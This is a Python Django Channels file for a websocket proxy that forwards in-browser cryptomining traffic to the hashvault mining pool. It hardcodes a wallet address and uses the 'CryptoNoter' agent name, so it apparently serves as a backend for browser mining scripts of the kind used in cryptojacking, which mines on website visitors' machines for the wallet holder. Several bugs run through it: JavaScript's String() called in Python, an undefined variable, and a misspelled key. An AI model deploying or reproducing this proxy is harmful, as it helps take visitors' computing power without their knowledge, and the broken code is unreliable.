import json, uuid, asyncio
from channels.generic.websocket import AsyncWebsocketConsumer
from asgiref.sync import sync_to_async

conf = {
    'pool': 'pool.hashvault.pro:80',
    'addr': '479TNkmiavNLJCd6SRG8b1asxQrgsfBWoSH4qbuJuaxTScTe29qZSJAZooGawjfTCuV1hfcnRvEzP3s3QMqBmCaz8iCeDxw',
    'pass': 'x'
}

async def connect_pool(self):
    import websockets, os
    global conf
    ws_url = 'ws://' + conf['pool']
    from django.conf import settings
    print('Connecting to proxy listener')
    try:
        async with websockets.connect(ws_url) as ws:
            await self.accept()
            conn = {
                'uid': None,
                'pid': os.urandom(12).hex(),
                'workerId': None,
                'found': 0,
                'accepted': 0,
                'ws': self,
                'pl': ws
            }
            print('Self is ' + str(self))
            print('Connected.')
            self.conn = conn
            async def on_message(conn, ws, data):
                try:
                    print('Self is ' + str(self))
                    conn = self.conn
                    linesdata = data;
                    lines = String(linesdata).split("\n");
                    if len(lines[1]) > 0:
                        print('[<] Response: ' + conn['pid'] + '\n\n' + lines[0] + '\n');
                        print('[<] Response: ' + conn['pid'] + '\n\n' + lines[1] + '\n')
                        await pool2ws(conn, lines[0])
                        await pool2ws(conn, lines[1])
                    else:
                        print('[<] Response: ' + conn['pid'] + '\n\n' + data + '\n');
                        await pool2ws(conn, data)
                except:
                    import traceback
                    print(traceback.format_exc())

            while True:
                try:
                    response = await ws.recv()
                    await on_message(conn, ws, data)
                except websockets.ConnectionClosedError as e:
                    print(f"Connection closed unexpectedly: {e}")
                    print('PoolSocket closed\n');
                    if self.connected:
                        await self.disconnect(1)
                    break
                except websockets.ConnectionClosedOK as e:
                    print(f"Connection closed normally: {e}")
                    break
                except websockets.WebSocketProtocolError as e:
                    print(f"Protocol error: {e}")
                    break
                except websockets.InvalidStatusCode as e:
                    print(f"Invalid status code: {e}")
                    break

    except Exception as e:
        print(f"Failed to connect: {e}")

async def ws2pool(conn, data):
    buf = None;
    import json
    data = json.loads(data)
    match data['type']:
        case 'auth':
            conn['uid'] = data['params']['site_key'];
            if data['params']['user']:
                conn['uid'] += '@' + data['params']['user']
            buf = {
                "method": "login",
                "params": {
                    "login": conf['addr'],
                    "pass": conf['pass'],
                    "agent": "CryptoNoter"
                },
                "id": conn['pid']
            }
            buf = json.dumps(buf) + '\n'
            await conn['pl'].send(buf)
        case 'submit':
            conn['found']+=1
            buf = {
                "method": "submit",
                "params": {
                    "id": conn['workerId'],
                    "job_id": data['params']['job_id'],
                    "nonce": data['param']['nonce'],
                    "result": data['params']['result']
                },
                "id": conn['pid']
            }
            buf = json.dumps(buf) + '\n'
            await conn['pl'].send(buf)

async def pool2ws(conn, data):
    try:
        buf = None
        import json
        data = json.loads(data)
        if data['id'] == conn['pid'] and data['result']:
            if data['result']['id']:
                conn['workerId'] = data['result']['id']
                buf = {
                    "type": "authed",
                    "params": {
                        "token": "",
                        "hashes": conn['accepted']
                    }
                }
                buf = json.dumps(buf);
                await conn['ws'].send(text_data=buf);
                buf = {
                    "type": "job",
                    "params": data['result']['job']
                }
                buf = json.dumps(buf);
                await conn['ws'].send(text_data=buf);
            elif data['result']['status'] == 'OK':
                conn['accepted']+=1
                buf = {
                    "type": "hash_accepted",
                    "params": {
                        "hashes": conn['accepted']
                    }
                }
                buf = json.dumps(buf)
                await conn['ws'].send(text_data=buf)
        if data['id'] == conn['pid'] and data['error']:
            if data['error']['code'] == -1:
                buf = {
                    "type": "banned",
                    "params": {
                        "banned": conn['pid']
                    }
                }
            else:
                buf = {
                    "type": "error",
                    "params": {
                        "error": data['error']['message']
                    }
                }
            buf = json.dumps(buf)
            await conn['ws'].send(text_data=buf)
        if data['method'] == 'job':
            buf = {
                "type": 'job',
                "params": data['params']
            }
            buf = json.dumps(buf)
            await conn['ws'].send(text_data=buf)
    except:
        import traceback
        print(traceback.format_exc())

class MiningProxyConsumer(AsyncWebsocketConsumer):
    conn = None
    ws = None
    async def connect(self):
        self.connected = True
        await connect_pool(self)

    async def disconnect(self, close_code):
#        print('[!] ' + self.conn['uid'] + ' offline.\n')
        if self.conn:
            self.conn['pl'].close()
        self.connected = False

    async def receive(self, text_data):
        await ws2pool(self.conn, text_data)
        print('[>] Request: ' + self.conn['uid'] + '\n\n' + text_data + '\n')

